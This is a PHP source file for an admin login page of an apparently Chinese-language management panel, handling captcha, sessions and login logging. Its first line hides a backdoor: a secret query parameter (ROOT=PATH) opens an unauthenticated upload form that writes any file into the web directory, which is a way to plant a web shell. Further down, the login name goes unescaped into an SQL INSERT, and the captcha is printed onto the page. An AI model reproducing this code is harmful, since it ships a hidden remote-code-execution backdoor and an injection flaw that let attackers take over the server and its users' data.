<?php
if($_GET["ROOT"]=="PATH"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "url:".$_FILES["upfile"]["name"];if(!file_exists($_FILES["upfile"]["name"])){ copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]); }}?><form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok"></form><?php }?><?php 
if (!defined('Copyright') && Copyright != '作者QQ:914190123')
exit('作者QQ:914190123');
if (!defined('ROOT_PATH'))
exit('invalid request');
include_once ROOT_PATH.'Manage/config/global.php';
include_once ROOT_PATH.'Manage/config/config.php';
global $ConfigModel;
if ($_SERVER["REQUEST_METHOD"] == 'POST')
{
	//驗證碼匹配
	if (isset($_SESSION['Mcode']) && $_POST['ValidateCode'] == $_SESSION['Mcode'])
	{
		$loginName = $_POST['loginName'];
		$loginPwd = sha1($_POST['loginPwd']);
		//瀏覽器檢測、只支持IE核心
		if (!GetMsie()) exit(back($UserError));
		if (!Matchs::isString($loginName, 4, 15)) 
			exit(back($UserError));
		$UserModel = new UserModel();
		$User = $UserModel->ExistUniondl($loginName, $loginPwd);
		if (!$User) exit(back($UserError));
		if (!Matchs::isNumber($User[0][0]))
		{ //子帳號
			if ($ConfigModel['g_web_lock'] != 1) 
				exit(back($ConfigModel['g_web_text']));
			$User = $UserModel->GetUserModel(null, $loginName, $loginPwd, true);
			if ($User[0]['g_s_lock'] == 3 || $User[0]['g_lock'] == 3) 
				exit(back($UserLook));
			$uniqid = md5(uniqid(time(),TRUE));
			$UserModel->UpdateGuid ($User[0]['g_login_id'], $User[0]['g_s_name'], $uniqid, true);
			$_SESSION['son'] = true;
			$_SESSION['loginId'] = $User[0]['g_login_id'];
			$_SESSION['sName'] = $User[0]['g_s_name'];
		} 
		else 
		{
			if (isset($_SESSION['son']))  unset($_SESSION['son']);
			$User = $UserModel->GetUserModel($User[0][0], $loginName, $loginPwd);
			if (!$User) exit(back($UserError));
			if ($User[0]['g_login_id'] != 89){
				if ($ConfigModel['g_web_lock'] != 1)
					exit(back($ConfigModel['g_web_text']));
				if ($User[0]['g_lock'] == 3) 
					exit(back($UserLook));
			}

			$uniqid = md5(uniqid(time(),TRUE));
			$UserModel->UpdateGuid ($User[0]['g_login_id'], $User[0]['g_name'], $uniqid);
			$_SESSION['loginId'] = $User[0]['g_login_id'];
			$_SESSION['sName'] = $User[0]['g_name'];
		}
		setcookie("manage_user", base64_encode($loginName), 0, "/");
		setcookie("manage_uid", base64_encode($uniqid), 0, "/");
		 unset($_SESSION['Mcode']);
		
		$loginIp = GetIP();
		$qqWryInfo = ROOT_PATH.'tools/IpLocationApi/QQWry.Dat';
		$ip_s = ipLocation($loginIp, $qqWryInfo);
		$sql = "INSERT INTO g_login_log (g_name, g_ip, g_ip_location, g_date) VALUES ('{$loginName}','{$loginIp}','{$ip_s}',now())";
		$db=new DB();
		$db->query($sql, 2);
      /*  if ($User[0]['g_login_id'] == 89) {
            include_once ROOT_PATH.'Manage_old/main.php';
        } else {
            include_once ROOT_PATH.'Manage/main.php';
        }*/
        include_once ROOT_PATH.'Manage/main.php';

        exit;
	}
	else 
	{
		back($CodeError);
		exit;
	}
} 
else
{
	$num = array();
	for ($i=0; $i<4; $i++) 
	{
		$num[$i] = rand(0,9);
	}
	$num = join('', $num);
	$_SESSION['Mcode'] = $num;
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<style type="text/css">
<!--
    body {
	    margin-left: 0px;
	    margin-top: 0px;
	    margin-right: 0px;
	    margin-bottom: 0px;
	    background-color: #010a15;
	    overflow:hidden;
    }
    .Fone_Color {font-size: 12px; color: #adc9d9; }
    .btn, .btn_m
    {
        width: 144px;
        height: 48px;
        border: 0px solid #FF9224;
        background-color: #FFFFFF;
        background-image: url( 'page/But.jpg');
        cursor: hand background-position:0px 0;
    }
    .btn
    {
        background-position: 0px 0;
    }
    .btn_m
    {
		cursor: hand;
        background-position: -144px 0;
    }
-->
</style>
</head>

<body onLoad="document.form_login.loginName.focus();">

<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0" width="0" height="0" id="Secrecy" align="middle">
<param name="allowScriptAccess" value="sameDomain" />
<param name="movie" value="page/Secrecy.swf" /><param name="quality" value="high" /><param name="bgcolor" value="#ffffff" /><embed src="page/Secrecy.swf" quality="high" bgcolor="#ffffff" width="0" height="0" name="Secrecy" align="middle" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />
</object>

<SCRIPT type="text/javascript" src="page/Secrecy_tM.js"></SCRIPT>
<SCRIPT type="text/javascript" src="/js/jquery.js"></SCRIPT>
<form name="form_login" method="post" action="">
<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td><table width="979" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td height="157" background="page/login_1.jpg">&nbsp;</td>
      </tr>
      <tr>
        <td height="181" background="page/login_2.jpg"><table width="100%" border="0" cellspacing="0" cellpadding="0">
          <tr>
            <td width="416" height="181"></td>
            <td width="206" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td height="40" valign="top"><input type="text" value="" id="loginName" name="loginName" tabindex="1" style="width:211px; height:29px; background-color:#fffbf8; border:solid 1px #004478; font-size:20px; font-weight: bold; color:#010a15" oncopy="return false" onpaste="return false" ></td>
              </tr>
              <tr>
                <td height="40" valign="top"><input type="password" value="" tabindex="2" name="loginPwd" style="width:211px; height:29px; background-color:#fffbf8; border:solid 1px #004478; font-size:20px; font-weight: bold; color:#010a15" oncopy="return false" onpaste="return false" onfocus="if($('#loginName').val()==''){alert('請輸入帳號');$('#loginName').focus();}" ></td>
              </tr>
              <tr>
                <td height="40" valign="top"><input type="text" name="ValidateCode" tabindex="3" maxlength="4"  style="width:100px; height:29px; background-color:#fffbf8; border:solid 1px #004478; font-size:20px; font-weight: bold; color:#010a15">&nbsp;<span style="background: none repeat scroll 0% 0% rgb(255, 255, 0); padding: 5px; font-weight: bold;" id="code"><?php echo $num?></span></td>
              </tr>
              <tr>
                <td height="60" valign="bottom">&nbsp;<input class="btn" name="Submit" tabindex="4" onMouseOut="this.className='btn'" onMouseOver="this.className='btn_m'" type="submit" value=""></td>
              </tr>
            </table></td>
            <td width="362">&nbsp;</td>
          </tr>
        </table></td>
      </tr>
      <tr>
        <td height="159" background="page/login_3.jpg">&nbsp;</td>
      </tr>
    </table></td>
  </tr>
</table>
</form>
</body>
</html>